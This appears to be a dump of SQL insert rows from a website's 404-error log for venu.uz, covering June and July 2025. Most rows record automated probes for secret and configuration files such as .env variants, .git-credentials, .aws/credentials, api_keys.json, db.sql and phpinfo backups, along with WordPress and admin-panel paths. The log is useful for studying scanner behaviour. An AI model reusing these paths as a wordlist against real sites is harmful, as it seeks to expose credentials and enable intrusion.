(894,404,'https://venu.uz/main.tf',1,NULL,NULL,'2025-06-30 20:33:35','2025-06-30 20:33:35'),
(895,404,'https://venu.uz/variables.tf',1,NULL,NULL,'2025-06-30 20:33:36','2025-06-30 20:33:36'),
(896,404,'https://venu.uz/terraform.tfvars',1,NULL,NULL,'2025-06-30 20:33:36','2025-06-30 20:33:36'),
(897,404,'https://venu.uz/template.yaml',1,NULL,NULL,'2025-06-30 20:33:36','2025-06-30 20:33:36'),
(898,404,'https://venu.uz/samconfig.toml',1,NULL,NULL,'2025-06-30 20:33:37','2025-06-30 20:33:37'),
(899,404,'https://venu.uz/CodePipeline',1,NULL,NULL,'2025-06-30 20:33:39','2025-06-30 20:33:39'),
(900,404,'https://venu.uz/buildspec.yml',1,NULL,NULL,'2025-06-30 20:33:39','2025-06-30 20:33:39'),
(901,404,'https://venu.uz/pipeline.yml',1,NULL,NULL,'2025-06-30 20:33:39','2025-06-30 20:33:39'),
(902,404,'https://venu.uz/config/database.json',2,NULL,NULL,'2025-06-30 20:33:40','2025-07-11 01:00:54'),
(903,404,'https://venu.uz/config/application.json',1,NULL,NULL,'2025-06-30 20:33:40','2025-06-30 20:33:40'),
(904,404,'https://venu.uz/auth/login',1,NULL,NULL,'2025-06-30 23:39:27','2025-06-30 23:39:27'),
(905,404,'https://venu.uz/login/dashboard',2,NULL,NULL,'2025-07-01 00:30:45','2025-07-01 00:30:45'),
(906,404,'https://venu.uz/admin/system-setup/language/translate/ru',1,NULL,NULL,'2025-07-01 00:56:19','2025-07-01 00:56:19'),
(907,404,'https://venu.uz/.env.dev',3,NULL,NULL,'2025-07-01 11:00:56','2025-07-11 01:00:15'),
(908,404,'https://venu.uz/.env.development',2,NULL,NULL,'2025-07-01 11:00:57','2025-07-11 01:00:43'),
(909,404,'https://venu.uz/.env.test',3,NULL,NULL,'2025-07-01 11:00:58','2025-07-11 01:00:23'),
(910,404,'https://venu.uz/config/config.env',1,NULL,NULL,'2025-07-01 11:01:00','2025-07-01 11:01:00'),
(911,404,'https://venu.uz/server/.env',2,NULL,NULL,'2025-07-01 11:01:02','2025-07-11 01:00:41'),
(912,404,'https://venu.uz/docker-compose.override.yml',1,NULL,NULL,'2025-07-01 11:01:06','2025-07-01 11:01:06'),
(913,404,'https://venu.uz/docker-compose.prod.yml',1,NULL,NULL,'2025-07-01 11:01:06','2025-07-01 11:01:06'),
(914,404,'https://venu.uz/docker-compose.dev.yml',1,NULL,NULL,'2025-07-01 11:01:07','2025-07-01 11:01:07'),
(915,404,'https://venu.uz/secrets.yml',1,NULL,NULL,'2025-07-01 11:01:10','2025-07-01 11:01:10'),
(916,404,'https://venu.uz/credentials.json',1,NULL,NULL,'2025-07-01 11:01:12','2025-07-01 11:01:12'),
(917,404,'https://venu.uz/.git-credentials',1,NULL,NULL,'2025-07-01 11:01:12','2025-07-01 11:01:12'),
(918,404,'https://venu.uz/.gitlab-ci.yml',1,NULL,NULL,'2025-07-01 11:01:12','2025-07-01 11:01:12'),
(919,404,'https://venu.uz/.github/workflows',1,NULL,NULL,'2025-07-01 11:01:13','2025-07-01 11:01:13'),
(920,404,'https://venu.uz/.idea/workspace.xml',1,NULL,NULL,'2025-07-01 11:01:13','2025-07-01 11:01:13'),
(921,404,'https://venu.uz/.vscode/settings.json',1,NULL,NULL,'2025-07-01 11:01:14','2025-07-01 11:01:14'),
(922,404,'https://venu.uz/logs/debug.log',1,NULL,NULL,'2025-07-01 11:01:15','2025-07-01 11:01:15'),
(923,404,'https://venu.uz/logs/app.log',1,NULL,NULL,'2025-07-01 11:01:16','2025-07-01 11:01:16'),
(924,404,'https://venu.uz/debug.log',1,NULL,NULL,'2025-07-01 11:01:16','2025-07-01 11:01:16'),
(925,404,'https://venu.uz/error.log',1,NULL,NULL,'2025-07-01 11:01:17','2025-07-01 11:01:17'),
(926,404,'https://venu.uz/.backup',1,NULL,NULL,'2025-07-01 11:01:18','2025-07-01 11:01:18'),
(927,404,'https://venu.uz/db.sql',1,NULL,NULL,'2025-07-01 11:01:19','2025-07-01 11:01:19'),
(928,404,'https://venu.uz/admin/category/view',3,NULL,NULL,'2025-07-01 11:59:15','2025-07-05 08:51:53'),
(929,404,'https://venu.uz/admin/sub-category/view',2,NULL,NULL,'2025-07-01 12:14:35','2025-07-01 12:37:13'),
(930,404,'https://venu.uz//wp-includes/ID3/license.txt',14,NULL,NULL,'2025-07-01 20:43:18','2025-07-09 04:43:17'),
(931,404,'https://venu.uz//feed',14,NULL,NULL,'2025-07-01 20:43:19','2025-07-09 04:43:18'),
(932,404,'https://venu.uz//2020/wp-includes/wlwmanifest.xml',14,NULL,NULL,'2025-07-01 20:43:21','2025-07-09 04:43:21'),
(933,404,'https://venu.uz//2021/wp-includes/wlwmanifest.xml',14,NULL,NULL,'2025-07-01 20:43:22','2025-07-09 04:43:21'),
(934,404,'https://venu.uz/customer/auth/facebook.com',4,NULL,NULL,'2025-07-01 20:49:01','2025-07-11 05:29:59'),
(935,404,'https://venu.uz/.well-known/assetlinks.json',1,NULL,NULL,'2025-07-02 10:50:24','2025-07-02 10:50:24'),
(936,404,'https://venu.uz//blog/robots.txt',4,NULL,NULL,'2025-07-03 15:48:02','2025-07-06 14:39:53'),
(937,404,'https://venu.uz//blog',4,NULL,NULL,'2025-07-03 15:48:02','2025-07-06 14:39:54'),
(938,404,'https://venu.uz//wordpress',4,NULL,NULL,'2025-07-03 15:48:03','2025-07-06 14:39:55'),
(939,404,'https://venu.uz//wp',4,NULL,NULL,'2025-07-03 15:48:04','2025-07-06 14:39:55'),
(940,404,'https://venu.uz/admin/system-setup/language',7,NULL,NULL,'2025-07-03 19:53:11','2025-07-04 01:02:09'),
(941,404,'https://venu.uz/admin/dashboard',15,NULL,NULL,'2025-07-03 20:47:46','2025-07-09 18:18:04'),
(942,404,'https://venu.uz/admin/vendors/list',8,NULL,NULL,'2025-07-03 21:24:01','2025-07-07 01:57:05'),
(943,404,'https://venu.uz/admin/vendors/add',4,NULL,NULL,'2025-07-03 21:25:14','2025-07-03 22:53:09'),
(944,404,'https://venu.uz/admin/products/request-restock-list',2,NULL,NULL,'2025-07-03 22:31:48','2025-07-03 22:31:49'),
(945,404,'https://venu.uz/admin/vendors/withdraw-list',3,NULL,NULL,'2025-07-03 22:54:42','2025-07-03 23:45:54'),
(946,404,'https://venu.uz/admin/vendors/withdraw-method/list',4,NULL,NULL,'2025-07-03 22:54:43','2025-07-03 23:46:02'),
(947,404,'https://venu.uz/admin/delivery-man/add',2,NULL,NULL,'2025-07-03 22:56:01','2025-07-03 22:56:02'),
(948,404,'https://venu.uz/admin/delivery-man/list',2,NULL,NULL,'2025-07-03 22:59:30','2025-07-03 22:59:32'),
(949,404,'https://venu.uz/admin/delivery-man/withdraw-list',2,NULL,NULL,'2025-07-03 22:59:31','2025-07-03 22:59:32'),
(950,404,'https://venu.uz/admin/delivery-man/emergency-contact',2,NULL,NULL,'2025-07-03 22:59:58','2025-07-03 22:59:59'),
(951,404,'https://venu.uz/admin/system-setup/file-manager/index',2,NULL,NULL,'2025-07-03 23:01:52','2025-07-03 23:01:53'),
(952,404,'https://venu.uz/admin/third-party/payment-method',3,NULL,NULL,'2025-07-03 23:01:53','2025-07-04 00:44:01'),
(953,404,'https://venu.uz/admin/third-party/offline-payment-method/index',4,NULL,NULL,'2025-07-03 23:03:08','2025-07-04 01:14:01'),
(954,404,'https://venu.uz/admin/third-party/analytics-index',4,NULL,NULL,'2025-07-03 23:03:46','2025-07-04 00:47:08'),
(955,404,'https://venu.uz/admin/third-party/social-login/view',4,NULL,NULL,'2025-07-03 23:04:29','2025-07-04 00:00:42'),
(956,404,'https://venu.uz/admin/system-setup/theme/setup',4,NULL,NULL,'2025-07-03 23:05:04','2025-07-03 23:39:09'),
(957,404,'https://venu.uz/admin/system-setup/addon',4,NULL,NULL,'2025-07-03 23:06:11','2025-07-03 23:48:19'),
(958,404,'https://venu.uz/admin/business-settings/vendor-settings',2,NULL,NULL,'2025-07-03 23:11:51','2025-07-03 23:11:52'),
(959,404,'https://venu.uz/admin/pos',10,NULL,NULL,'2025-07-03 23:30:48','2025-07-09 18:18:50'),
(960,404,'https://venu.uz/admin/vendors/view/3/clearance_sale',1,NULL,NULL,'2025-07-03 23:40:08','2025-07-03 23:40:08'),
(961,404,'https://venu.uz/admin/vendors/view/3/setting',1,NULL,NULL,'2025-07-03 23:40:09','2025-07-03 23:40:09'),
(962,404,'https://venu.uz/admin/vendors/view/3/transaction',2,NULL,NULL,'2025-07-03 23:41:39','2025-07-03 23:41:40'),
(963,404,'https://venu.uz/admin/vendors/view/3/review',2,NULL,NULL,'2025-07-03 23:41:40','2025-07-03 23:41:41'),
(964,404,'https://venu.uz/admin/customer/wallet/report',2,NULL,NULL,'2025-07-03 23:43:59','2025-07-03 23:43:59'),
(965,404,'https://venu.uz/admin/customer/list',2,NULL,NULL,'2025-07-03 23:53:09','2025-07-03 23:53:10'),
(966,404,'https://venu.uz/admin/customer/view/2',2,NULL,NULL,'2025-07-03 23:57:42','2025-07-03 23:57:43'),
(967,404,'https://venu.uz/admin/vendors/view/2',1,NULL,NULL,'2025-07-04 00:04:09','2025-07-04 00:04:09'),
(968,404,'https://venu.uz/admin/reviews/list',2,NULL,NULL,'2025-07-04 00:38:26','2025-07-04 00:38:27'),
(969,404,'https://venu.uz/admin/vendors/view/3',2,NULL,NULL,'2025-07-04 00:39:54','2025-07-04 00:39:55'),
(970,404,'https://venu.uz/admin/vendors/view/3/order',2,NULL,NULL,'2025-07-04 00:41:22','2025-07-04 00:41:23'),
(971,404,'https://venu.uz/admin/business-settings/delivery-man-settings',2,NULL,NULL,'2025-07-04 00:41:29','2025-07-04 00:41:29'),
(972,404,'https://venu.uz/admin/business-settings/shipping-method/index',2,NULL,NULL,'2025-07-04 00:41:30','2025-07-04 00:41:30'),
(973,404,'https://venu.uz/admin/vendors/view/3/product',2,NULL,NULL,'2025-07-04 00:41:55','2025-07-04 00:41:56'),
(974,404,'https://venu.uz/admin/business-settings/delivery-restriction',2,NULL,NULL,'2025-07-04 00:42:29','2025-07-04 00:42:30'),
(975,404,'https://venu.uz/admin/business-settings/website-setup',2,NULL,NULL,'2025-07-04 00:49:29','2025-07-04 00:49:29'),
(976,404,'https://venu.uz/admin/products/list/vendor?request_status=2',1,NULL,NULL,'2025-07-04 09:44:00','2025-07-04 09:44:00'),
(977,404,'https://venu.uz/admin/products/list/vendor',3,NULL,NULL,'2025-07-04 09:44:01','2025-07-07 01:53:47'),
(978,404,'https://venu.uz/admin/products/list',3,NULL,NULL,'2025-07-04 09:44:02','2025-07-08 17:22:55'),
(979,404,'https://venu.uz/admin/employee/list',2,NULL,NULL,'2025-07-05 07:32:12','2025-07-05 07:32:12'),
(980,404,'https://venu.uz/admin/employee/add',2,NULL,NULL,'2025-07-05 07:32:12','2025-07-05 07:32:13'),
(981,404,'https://venu.uz/admin/custom-role/add',2,NULL,NULL,'2025-07-05 07:34:15','2025-07-05 07:34:16'),
(982,404,'https://venu.uz/admin/brand/add-new',2,NULL,NULL,'2025-07-05 08:22:02','2025-07-05 08:22:02'),
(983,404,'https://venu.uz/admin/brand/list',1,NULL,NULL,'2025-07-05 08:25:08','2025-07-05 08:25:08'),
(984,404,'https://venu.uz/admin/messages/index/customer',2,NULL,NULL,'2025-07-05 08:33:51','2025-07-05 08:33:51'),
(985,404,'https://venu.uz/admin/products/list/in-house',2,NULL,NULL,'2025-07-05 08:37:57','2025-07-05 08:37:58'),
(986,404,'https://venu.uz/07-accessing-data/begin/vue-heroes/.env',1,NULL,NULL,'2025-07-06 15:41:10','2025-07-06 15:41:10'),
(987,404,'https://venu.uz/09-managing-state/begin/vue-heroes/.env',1,NULL,NULL,'2025-07-06 15:41:11','2025-07-06 15:41:11'),
(988,404,'https://venu.uz/07-accessing-data/end/vue-heroes/.env',1,NULL,NULL,'2025-07-06 15:41:11','2025-07-06 15:41:11'),
(989,404,'https://venu.uz/09-managing-state/end/vue-heroes/.env',1,NULL,NULL,'2025-07-06 15:41:12','2025-07-06 15:41:12'),
(990,404,'https://venu.uz/app/code/community/Nosto/Tagging/.env',1,NULL,NULL,'2025-07-06 15:41:12','2025-07-06 15:41:12'),
(991,404,'https://venu.uz/08-routing/begin/vue-heroes/.env',1,NULL,NULL,'2025-07-06 15:41:12','2025-07-06 15:41:12'),
(992,404,'https://venu.uz/08-routing/end/vue-heroes/.env',1,NULL,NULL,'2025-07-06 15:41:13','2025-07-06 15:41:13'),
(993,404,'https://venu.uz/.c9/metadata/environment/.env',1,NULL,NULL,'2025-07-06 15:41:13','2025-07-06 15:41:13'),
(994,404,'https://venu.uz/app_nginx_static_path/.env',1,NULL,NULL,'2025-07-06 15:41:14','2025-07-06 15:41:14'),
(995,404,'https://venu.uz/.docker/laravel/app/.env',2,NULL,NULL,'2025-07-06 15:41:15','2025-07-11 01:01:11'),
(996,404,'https://venu.uz/31_structure_tests/.env',1,NULL,NULL,'2025-07-06 15:41:15','2025-07-06 15:41:15'),
(997,404,'https://venu.uz/.env.development.local',2,NULL,NULL,'2025-07-06 15:41:16','2025-07-11 01:00:21'),
(998,404,'https://venu.uz/tests/test-become/.env',1,NULL,NULL,'2025-07-06 15:41:16','2025-07-06 15:41:16'),
(999,404,'https://venu.uz/3-sequelize/final/.env',1,NULL,NULL,'2025-07-06 15:41:17','2025-07-06 15:41:17'),
(1000,404,'https://venu.uz/app-order-client/.env',1,NULL,NULL,'2025-07-06 15:41:17','2025-07-06 15:41:17'),
(1001,404,'https://venu.uz/acme_challenges/.env',1,NULL,NULL,'2025-07-06 15:41:20','2025-07-06 15:41:20'),
(1002,404,'https://venu.uz/acme-challenge/.env',1,NULL,NULL,'2025-07-06 15:41:21','2025-07-06 15:41:21'),
(1003,404,'https://venu.uz/actions-server/.env',1,NULL,NULL,'2025-07-06 15:41:22','2025-07-06 15:41:22'),
(1004,404,'https://venu.uz/app/config/dev/.env',1,NULL,NULL,'2025-07-06 15:41:22','2025-07-06 15:41:22'),
(1005,404,'https://venu.uz/administrator/.env',2,NULL,NULL,'2025-07-06 15:41:23','2025-07-11 01:00:54'),
(1006,404,'https://venu.uz/app/frontend/.env',1,NULL,NULL,'2025-07-06 15:41:24','2025-07-06 15:41:24'),
(1007,404,'https://venu.uz/app2-static/.env',1,NULL,NULL,'2025-07-06 15:41:25','2025-07-06 15:41:25'),
(1008,404,'https://venu.uz/Assignment4/.env',1,NULL,NULL,'2025-07-06 15:41:25','2025-07-06 15:41:25'),
(1009,404,'https://venu.uz/apps/client/.env',1,NULL,NULL,'2025-07-06 15:41:26','2025-07-06 15:41:26'),
(1010,404,'https://venu.uz/Assignment3/.env',1,NULL,NULL,'2025-07-06 15:41:26','2025-07-06 15:41:26'),
(1011,404,'https://venu.uz/app1-static/.env',1,NULL,NULL,'2025-07-06 15:41:27','2025-07-06 15:41:27'),
(1012,404,'https://venu.uz/.gitlab-ci/.env',1,NULL,NULL,'2025-07-06 15:41:27','2025-07-06 15:41:27'),
(1013,404,'https://venu.uz/.env.test.local',2,NULL,NULL,'2025-07-06 15:41:28','2025-07-11 01:00:33'),
(1014,404,'https://venu.uz/app/config/.env',1,NULL,NULL,'2025-07-06 15:41:28','2025-07-06 15:41:28'),
(1015,404,'https://venu.uz/app/client/.env',1,NULL,NULL,'2025-07-06 15:41:29','2025-07-06 15:41:29'),
(1016,404,'https://venu.uz/.env.docker.dev',2,NULL,NULL,'2025-07-06 15:41:29','2025-07-11 01:00:22'),
(1017,404,'https://venu.uz/admin-app/.env',1,NULL,NULL,'2025-07-06 15:41:29','2025-07-06 15:41:29'),
(1018,404,'https://venu.uz/asset_img/.env',1,NULL,NULL,'2025-07-06 15:41:30','2025-07-06 15:41:30'),
(1019,404,'https://venu.uz/Archipel/.env',1,NULL,NULL,'2025-07-06 15:41:31','2025-07-06 15:41:31'),
(1020,404,'https://venu.uz/anaconda/.env',1,NULL,NULL,'2025-07-06 15:41:31','2025-07-06 15:41:31'),
(1021,404,'https://venu.uz/adminer/.env',1,NULL,NULL,'2025-07-06 15:41:32','2025-07-06 15:41:32'),
(1022,404,'https://venu.uz/.docker/.env',2,NULL,NULL,'2025-07-06 15:41:32','2025-07-11 01:00:15'),
(1023,404,'https://venu.uz/_static/.env',1,NULL,NULL,'2025-07-06 15:41:33','2025-07-06 15:41:33'),
(1024,404,'https://venu.uz/example/.env',1,NULL,NULL,'2025-07-06 15:41:33','2025-07-06 15:41:33'),
(1025,404,'https://venu.uz/app_dir/.env',1,NULL,NULL,'2025-07-06 15:41:34','2025-07-06 15:41:34'),
(1026,404,'https://venu.uz/api/src/.env',1,NULL,NULL,'2025-07-06 15:41:34','2025-07-06 15:41:34'),
(1027,404,'https://venu.uz/assets/.env',1,NULL,NULL,'2025-07-06 15:41:45','2025-07-06 15:41:45'),
(1028,404,'https://venu.uz/agora/.env',1,NULL,NULL,'2025-07-06 15:41:47','2025-07-06 15:41:47'),
(1029,404,'https://venu.uz/alpha/.env',1,NULL,NULL,'2025-07-06 15:41:49','2025-07-06 15:41:49'),
(1030,404,'https://venu.uz/audio/.env',1,NULL,NULL,'2025-07-06 15:41:50','2025-07-06 15:41:50'),
(1031,404,'https://venu.uz/.env.save',2,NULL,NULL,'2025-07-06 15:41:52','2025-07-11 01:00:32'),
(1032,404,'https://venu.uz/acme/.env',1,NULL,NULL,'2025-07-06 15:41:52','2025-07-06 15:41:52'),
(1033,404,'https://venu.uz/.env~',1,NULL,NULL,'2025-07-06 15:41:57','2025-07-06 15:41:57'),
(1034,404,'https://venu.uz/home/user/.aws/credentials',1,NULL,NULL,'2025-07-06 19:14:05','2025-07-06 19:14:05'),
(1035,404,'https://venu.uz/config.py',1,NULL,NULL,'2025-07-06 19:14:10','2025-07-06 19:14:10'),
(1036,404,'https://venu.uz/0',2,NULL,NULL,'2025-07-07 11:23:57','2025-07-09 18:16:59'),
(1037,404,'https://venu.uz/admin',3,NULL,NULL,'2025-07-07 11:28:18','2025-07-11 22:44:54'),
(1038,404,'https://venu.uz/admin/login',7,NULL,NULL,'2025-07-07 11:29:25','2025-07-11 22:44:58'),
(1039,404,'https://venu.uz/loginadmin',1,NULL,NULL,'2025-07-07 11:29:49','2025-07-07 11:29:49'),
(1040,404,'https://venu.uz/admin/business-settings/web-config',2,NULL,NULL,'2025-07-07 23:19:34','2025-07-07 23:19:35'),
(1041,404,'https://venu.uz/admin/products/get-categories?parent_id=1',1,NULL,NULL,'2025-07-08 17:29:21','2025-07-08 17:29:21'),
(1042,404,'https://venu.uz/wp-includes/id3/license.txt/feed',1,NULL,NULL,'2025-07-09 22:31:37','2025-07-09 22:31:37'),
(1043,404,'https://venu.uz/wp-includes/id3/license.txt/blog/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:38','2025-07-09 22:31:38'),
(1044,404,'https://venu.uz/wp-includes/id3/license.txt/web/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:38','2025-07-09 22:31:38'),
(1045,404,'https://venu.uz/wp-includes/id3/license.txt/wordpress/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:39','2025-07-09 22:31:39'),
(1046,404,'https://venu.uz/wp-includes/id3/license.txt/wp/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:40','2025-07-09 22:31:40'),
(1047,404,'https://venu.uz/wp-includes/id3/license.txt/2020/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:40','2025-07-09 22:31:40'),
(1048,404,'https://venu.uz/wp-includes/id3/license.txt/2019/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:41','2025-07-09 22:31:41'),
(1049,404,'https://venu.uz/wp-includes/id3/license.txt/2021/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:42','2025-07-09 22:31:42'),
(1050,404,'https://venu.uz/wp-includes/id3/license.txt/shop/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:42','2025-07-09 22:31:42'),
(1051,404,'https://venu.uz/wp-includes/id3/license.txt/wp1/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:53','2025-07-09 22:31:53'),
(1052,404,'https://venu.uz/wp-includes/id3/license.txt/test/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:54','2025-07-09 22:31:54'),
(1053,404,'https://venu.uz/wp-includes/id3/license.txt/site/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:55','2025-07-09 22:31:55'),
(1054,404,'https://venu.uz/wp-includes/id3/license.txt/cms/wp-includes/wlwmanifest.xml',1,NULL,NULL,'2025-07-09 22:31:55','2025-07-09 22:31:55'),
(1055,404,'https://venu.uz/.well-known/apple-app-site-association',3,NULL,NULL,'2025-07-10 08:33:22','2025-07-11 09:05:06'),
(1056,404,'https://venu.uz/apple-app-site-association',3,NULL,NULL,'2025-07-10 08:33:25','2025-07-11 09:01:22'),
(1057,404,'https://venu.uz/info.php.bak',1,NULL,NULL,'2025-07-11 01:00:07','2025-07-11 01:00:07'),
(1058,404,'https://venu.uz/info.php.1',1,NULL,NULL,'2025-07-11 01:00:08','2025-07-11 01:00:08'),
(1059,404,'https://venu.uz/info.php.back',1,NULL,NULL,'2025-07-11 01:00:08','2025-07-11 01:00:08'),
(1060,404,'https://venu.uz/phpinfo.php3',1,NULL,NULL,'2025-07-11 01:00:09','2025-07-11 01:00:09'),
(1061,404,'https://venu.uz/phpinfo.php.txt',1,NULL,NULL,'2025-07-11 01:00:10','2025-07-11 01:00:10'),
(1062,404,'https://venu.uz/info.php.save.1',1,NULL,NULL,'2025-07-11 01:00:10','2025-07-11 01:00:10'),
(1063,404,'https://venu.uz/info.php_',1,NULL,NULL,'2025-07-11 01:00:10','2025-07-11 01:00:10'),
(1064,404,'https://venu.uz/phpinfo.php.bak',1,NULL,NULL,'2025-07-11 01:00:12','2025-07-11 01:00:12'),
(1065,404,'https://venu.uz/admin/admin_phpinfo.php4',1,NULL,NULL,'2025-07-11 01:00:12','2025-07-11 01:00:12'),
(1066,404,'https://venu.uz/.env.www',1,NULL,NULL,'2025-07-11 01:00:14','2025-07-11 01:00:14'),
(1067,404,'https://venu.uz/.env_1',1,NULL,NULL,'2025-07-11 01:00:16','2025-07-11 01:00:16'),
(1068,404,'https://venu.uz/.pam_environment',1,NULL,NULL,'2025-07-11 01:00:17','2025-07-11 01:00:17'),
(1069,404,'https://venu.uz/.environment',1,NULL,NULL,'2025-07-11 01:00:17','2025-07-11 01:00:17'),
(1070,404,'https://venu.uz/env.js',1,NULL,NULL,'2025-07-11 01:00:19','2025-07-11 01:00:19'),
(1071,404,'https://venu.uz/.powenv',1,NULL,NULL,'2025-07-11 01:00:19','2025-07-11 01:00:19'),
(1072,404,'https://venu.uz/.rbenv-gemsets',1,NULL,NULL,'2025-07-11 01:00:19','2025-07-11 01:00:19'),
(1073,404,'https://venu.uz/.envs',1,NULL,NULL,'2025-07-11 01:00:20','2025-07-11 01:00:20'),
(1074,404,'https://venu.uz/.env.docker',1,NULL,NULL,'2025-07-11 01:00:20','2025-07-11 01:00:20'),
(1075,404,'https://venu.uz/.env_bak',1,NULL,NULL,'2025-07-11 01:00:21','2025-07-11 01:00:21'),
(1076,404,'https://venu.uz/.env-example',1,NULL,NULL,'2025-07-11 01:00:22','2025-07-11 01:00:22'),
(1077,404,'https://venu.uz/env',1,NULL,NULL,'2025-07-11 01:00:23','2025-07-11 01:00:23'),
(1078,404,'https://venu.uz/env.list',1,NULL,NULL,'2025-07-11 01:00:24','2025-07-11 01:00:24'),
(1079,404,'https://venu.uz/.ghc.environment',1,NULL,NULL,'2025-07-11 01:00:24','2025-07-11 01:00:24'),
(1080,404,'https://venu.uz/env.txt',1,NULL,NULL,'2025-07-11 01:00:24','2025-07-11 01:00:24'),
(1081,404,'https://venu.uz/printenv',1,NULL,NULL,'2025-07-11 01:00:25','2025-07-11 01:00:25'),
(1082,404,'https://venu.uz/.hsenv',1,NULL,NULL,'2025-07-11 01:00:25','2025-07-11 01:00:25'),
(1083,404,'https://venu.uz/environment',1,NULL,NULL,'2025-07-11 01:00:25','2025-07-11 01:00:25'),
(1084,404,'https://venu.uz/env.json',1,NULL,NULL,'2025-07-11 01:00:26','2025-07-11 01:00:26'),
(1085,404,'https://venu.uz/envrc',1,NULL,NULL,'2025-07-11 01:00:26','2025-07-11 01:00:26'),
(1086,404,'https://venu.uz/.env.dev.local',1,NULL,NULL,'2025-07-11 01:00:27','2025-07-11 01:00:27'),
(1087,404,'https://venu.uz/environment.ts',1,NULL,NULL,'2025-07-11 01:00:27','2025-07-11 01:00:27'),
(1088,404,'https://venu.uz/.env_old',1,NULL,NULL,'2025-07-11 01:00:27','2025-07-11 01:00:27'),
(1089,404,'https://venu.uz/.zshenv',1,NULL,NULL,'2025-07-11 01:00:28','2025-07-11 01:00:28'),
(1090,404,'https://venu.uz/.env.development.sample',1,NULL,NULL,'2025-07-11 01:00:28','2025-07-11 01:00:28'),
(1091,404,'https://venu.uz/.rbenv-version',1,NULL,NULL,'2025-07-11 01:00:29','2025-07-11 01:00:29'),
(1092,404,'https://venu.uz/.env-sample',1,NULL,NULL,'2025-07-11 01:00:29','2025-07-11 01:00:29'),
(1093,404,'https://venu.uz/.env.prod.local',1,NULL,NULL,'2025-07-11 01:00:29','2025-07-11 01:00:29'),
(1094,404,'https://venu.uz/.env.travis',1,NULL,NULL,'2025-07-11 01:00:30','2025-07-11 01:00:30'),
(1095,404,'https://venu.uz/.env.test.sample',1,NULL,NULL,'2025-07-11 01:00:30','2025-07-11 01:00:30'),
(1096,404,'https://venu.uz/.env.2',1,NULL,NULL,'2025-07-11 01:00:30','2025-07-11 01:00:30'),
(1097,404,'https://venu.uz/.env.txt',1,NULL,NULL,'2025-07-11 01:00:32','2025-07-11 01:00:32'),
(1098,404,'https://venu.uz/printenv.tmp',1,NULL,NULL,'2025-07-11 01:00:32','2025-07-11 01:00:32'),
(1099,404,'https://venu.uz/.jenv-version',1,NULL,NULL,'2025-07-11 01:00:33','2025-07-11 01:00:33'),
(1100,404,'https://venu.uz/.envrc',1,NULL,NULL,'2025-07-11 01:00:34','2025-07-11 01:00:34'),
(1101,404,'https://venu.uz/.env.dist',1,NULL,NULL,'2025-07-11 01:00:35','2025-07-11 01:00:35'),
(1102,404,'https://venu.uz/.env1',1,NULL,NULL,'2025-07-11 01:00:35','2025-07-11 01:00:35'),
(1103,404,'https://venu.uz/.venv',1,NULL,NULL,'2025-07-11 01:00:36','2025-07-11 01:00:36'),
(1104,404,'https://venu.uz/env.prod.js',1,NULL,NULL,'2025-07-11 01:00:36','2025-07-11 01:00:36'),
(1105,404,'https://venu.uz/env.test.js',1,NULL,NULL,'2025-07-11 01:00:37','2025-07-11 01:00:37'),
(1106,404,'https://venu.uz/env.bak',1,NULL,NULL,'2025-07-11 01:00:37','2025-07-11 01:00:37'),
(1107,404,'https://venu.uz/k8s/.env',1,NULL,NULL,'2025-07-11 01:00:38','2025-07-11 01:00:38'),
(1108,404,'https://venu.uz/src/.env',1,NULL,NULL,'2025-07-11 01:00:40','2025-07-11 01:00:40'),
(1109,404,'https://venu.uz/client/.env',1,NULL,NULL,'2025-07-11 01:00:42','2025-07-11 01:00:42'),
(1110,404,'https://venu.uz/frontend/.env',1,NULL,NULL,'2025-07-11 01:00:42','2025-07-11 01:00:42'),
(1111,404,'https://venu.uz/.env.staging',1,NULL,NULL,'2025-07-11 01:00:43','2025-07-11 01:00:43'),
(1112,404,'https://venu.uz/.env.live',1,NULL,NULL,'2025-07-11 01:00:43','2025-07-11 01:00:43'),
(1113,404,'https://venu.uz/config/sendgrid.json',1,NULL,NULL,'2025-07-11 01:00:46','2025-07-11 01:00:46'),
(1114,404,'https://venu.uz/config/mailgun.json',1,NULL,NULL,'2025-07-11 01:00:47','2025-07-11 01:00:47'),
(1115,404,'https://venu.uz/sendgrid.json',1,NULL,NULL,'2025-07-11 01:00:47','2025-07-11 01:00:47'),
(1116,404,'https://venu.uz/aws.json',1,NULL,NULL,'2025-07-11 01:00:47','2025-07-11 01:00:47'),
(1117,404,'https://venu.uz/api_keys.json',1,NULL,NULL,'2025-07-11 01:00:48','2025-07-11 01:00:48'),
(1118,404,'https://venu.uz/keys.json',1,NULL,NULL,'2025-07-11 01:00:48','2025-07-11 01:00:48'),
(1119,404,'https://venu.uz/private/.env',1,NULL,NULL,'2025-07-11 01:00:49','2025-07-11 01:00:49'),
(1120,404,'https://venu.uz/backup/.env',1,NULL,NULL,'2025-07-11 01:00:49','2025-07-11 01:00:49'),
(1121,404,'https://venu.uz/test/.env',1,NULL,NULL,'2025-07-11 01:00:50','2025-07-11 01:00:50'),
(1122,404,'https://venu.uz/staging/.env',1,NULL,NULL,'2025-07-11 01:00:50','2025-07-11 01:00:50'),
(1123,404,'https://venu.uz/production/.env',1,NULL,NULL,'2025-07-11 01:00:51','2025-07-11 01:00:51'),
(1124,404,'https://venu.uz/app/config.json',1,NULL,NULL,'2025-07-11 01:00:52','2025-07-11 01:00:52'),
(1125,404,'https://venu.uz/database.yml',1,NULL,NULL,'2025-07-11 01:00:53','2025-07-11 01:00:53'),
(1126,404,'https://venu.uz/cms/.env',1,NULL,NULL,'2025-07-11 01:00:54','2025-07-11 01:00:54'),
(1127,404,'https://venu.uz/dashboard/.env',1,NULL,NULL,'2025-07-11 01:00:55','2025-07-11 01:00:55'),
(1128,404,'https://venu.uz/deployment/.env',1,NULL,NULL,'2025-07-11 01:00:57','2025-07-11 01:00:57'),
